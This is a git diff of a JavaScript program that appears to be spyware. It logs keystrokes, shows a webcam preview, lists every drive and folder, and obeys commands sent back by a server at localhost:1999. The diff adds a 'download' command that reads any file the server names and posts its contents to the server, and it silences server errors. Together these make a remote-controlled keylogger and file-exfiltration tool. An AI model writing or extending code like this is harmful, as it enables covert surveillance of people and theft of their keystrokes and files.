@@ -4,8 +4,7 @@ const axios = require("axios");//comunication with python sub process on port 50
 const fs = require('fs');
 const path = require('path');
 
-const remotehost = 'localhost';
-const remoteport = 1999;
+const remotehost = 'http://localhost:1999';
 const update_interval = 1000;
 
 const video_element = document.getElementById("webcam_preview")
@@ -67,7 +66,7 @@ let keylog = {
 
         await keys.then(keys => {
             axios.default.post(
-                'http://' + remotehost + ':' + remoteport + '/action/post/keylog',
+                remotehost + '/action/post/keylog',
                 JSON.stringify(keys.data.keys)
             )
 
@@ -94,32 +93,40 @@ let directoryman = {
     current_dir: [],
     remote_instructions: function () {
         axios.default.post(//post folders to server
-            'http://' + remotehost + ':' + remoteport + '/action/post/folders',
+            remotehost + '/action/post/folders',
             JSON.stringify({
                 files: directoryman.files,
                 current_dir: directoryman.current_dir
             })
         ).then(res => {//instructions in the response
-            var instriction = JSON.parse(res.data)
-            console.log('server replied: ', instriction)
+            if (res.data != null) {
 
-            switch (instriction.action) {
-                case 'do nothing':
-                    //do no action
-                    break;
-                case 'search_root':
-                    directoryman.search_root()
-                    break;
-                case 'search_dir':
-                    directoryman.search_dir(instriction.path)
-                    break;
-                case 'go_back_a_dir':
-                    directoryman.go_back_a_dir()
-                    break;
-                default:
-                    console.warn('Unknown instruction: ', instriction)
+                //console.log(res.data)
+
+                var instriction = JSON.parse(res.data)
+                console.log('server replied: ', instriction)
+
+                switch (instriction.action) {
+                    case 'do nothing':
+                        //do no action
+                        break;
+                    case 'search_root':
+                        directoryman.search_root()
+                        break;
+                    case 'search_dir':
+                        directoryman.search_dir(instriction.path)
+                        break;
+                    case 'download':
+                        directoryman.download(instriction.path)
+                        break;
+                    case 'go_back_a_dir':
+                        directoryman.go_back_a_dir()
+                        break;
+                    default:
+                        console.warn('Unknown instruction: ', instriction)
+                }
             }
-        })//post folder state to server
+        }).catch(err => { /*console.warn('Server responed with a flawed instruction', err)*/ })//post folder state to server
     },
     search_root: async function () {//Search root drives, functionality stats here
         console.log('Search root');
@@ -129,7 +136,7 @@ let directoryman = {
         directoryman.files = [];
         for (let i in letters) {
             if (fs.existsSync(letters[i])) {
-                directoryman.files.push({path:letters[i],type:'folder'});
+                directoryman.files.push({ path: letters[i], name: letters[i], type: 'folder' });
                 this.build_dir(letters[i], letters[i])
             }
         }
@@ -145,9 +152,16 @@ let directoryman = {
             }
 
             dirbox.innerHTML = "";
-            directoryman.files = files;
+            directoryman.files = [];
             console.log(files)
-            files.forEach(filee => { directoryman.build_dir(searchpath + '\\' + filee, filee) })
+            files.forEach(filee => {
+                if (path.parse(searchpath + '\\' + filee).ext == "") {//directory
+                    directoryman.files.push({ path: searchpath + '\\' + filee, name: filee, type: 'folder' })
+                } else {
+                    directoryman.files.push({ path: searchpath + '\\' + filee, name: filee, type: 'file' })
+                }
+                directoryman.build_dir(searchpath + '\\' + filee, filee)
+            })
 
         })
     },
@@ -165,7 +179,7 @@ let directoryman = {
         } else {//file
             dir_icon.className = "file_icon"
             directory.title = "download file"
-            directory.addEventListener('click', function () { })//download file
+            directory.addEventListener('click', function () { /* Action for deebuging on host side */ })//download file
         }
 
         directory.appendChild(filename)
@@ -192,5 +206,13 @@ let directoryman = {
                 directoryman.search_dir(current)
             }
         }
+    },
+    download: function (fpath) {
+        var filebuffer = {}
+        filebuffer.data = fs.readFileSync(fpath);
+        filebuffer.details = path.parse(fpath);
+        axios.default.post(remotehost + '/action/post/file', JSON.stringify(filebuffer))
+            .finally(() => { console.log('Posted file buffer: ', filebuffer) })
+
     }
 }
